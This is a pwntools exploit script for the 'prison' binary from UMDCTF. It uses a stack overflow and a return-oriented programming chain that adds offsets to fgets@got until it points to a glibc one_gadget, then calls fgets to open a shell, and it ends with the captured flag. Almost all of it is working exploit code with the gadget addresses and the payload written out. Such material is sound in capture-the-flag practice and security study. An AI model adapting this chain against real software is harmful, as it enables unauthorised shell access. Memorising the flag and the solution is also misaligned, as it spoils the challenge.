from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./prison_patched', '''
    b *(main+37)
    continue
''')

# p = remote('challs.umdctf.io', 31001)

GADGET_1 = 0x400608  # pop rbp; ret;
GADGET_2 = 0x4005cf  # add bl, dh; ret;
GADGET_3 = 0x400668  # add dword ptr [rbp-0x3d], ebx; nop dword ptr [rax+rax]; repz ret;
GADGET_4 = 0x400782  # pop rdi; xor rbx, rbx; ret;

FGETS_PLT = 0x400560  # fgets@plt
FGETS_GOT = 0x601020  # fgets@got

WRITABLE_AREA = 0x601800  # writable area

# 0xebce2 execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp
GLIBC_ONE_GADGET_OFFSET = 0xebce2
GLIBC_FGETS_OFFSET = 0x7f380

# ROP with special gadgets
chain = [
    # 1. utilize multiple special gadgets and shellcode starting from _IO_fgets+0x60*3 to change fgets@got from glibc_fgets to glibc_one_gadget by adding offset between glibc_fgets and glibc_one_gadget to fgets@got
    GADGET_1, FGETS_GOT+0x3d,  # rbp=fgets@got+0x3d
    GADGET_2,  # rbx=0x0+0x20=0x20
    GADGET_2,  # rbx=0x20+0x20=0x40
    GADGET_2,  # rbx=0x40+0x20=0x60
    GADGET_3,  # fgets@got=glibc_fgets+0x60
    GADGET_3,  # fgets@got=glibc_fgets+0x60+0x60=glibc_fgets+0x60*2
    GADGET_3,  # fgets@got=glibc_fgets+0x60*2+0x60=glibc_fgets+0x60*3
    GADGET_4, WRITABLE_AREA,  # rdi=0x601800
    # fgets@got=glibc_fgets+0x60*3: mov byte ptr [rdi], 0x0; mov r14, rdi; jmp 0x7f44c; pop rbx; mov rax, r14; pop rbp; pop r12; pop r13; pop r14; ret;
    FGETS_PLT, GLIBC_ONE_GADGET_OFFSET-GLIBC_FGETS_OFFSET-0x60*3, FGETS_GOT+0x3d, 0, 0, 0,  # rbx=glibc_one_gadget_offset-glibc_fgets_offset-0x60*3, rbp=fgets@got+0x3d, r12=0, r13=0, r14=0
    GADGET_3,  # fgets@got=glibc_fgets+0x60*3+glibc_one_gadget_offset-glibc_fgets_offset-0x60*3=glibc_one_gadget
    # 2. call fgets@plt to trigger one gadget to pop a shell
    # fgets@got=glibc_one_gadget
    FGETS_PLT
]
p.sendline(b'A'*0x28+b''.join([p64(c) for c in chain]))

p.interactive() 

# UMDCTF{are_you_sice_man_because_you_were_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_or_are_you_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_because_you_are_sice_man}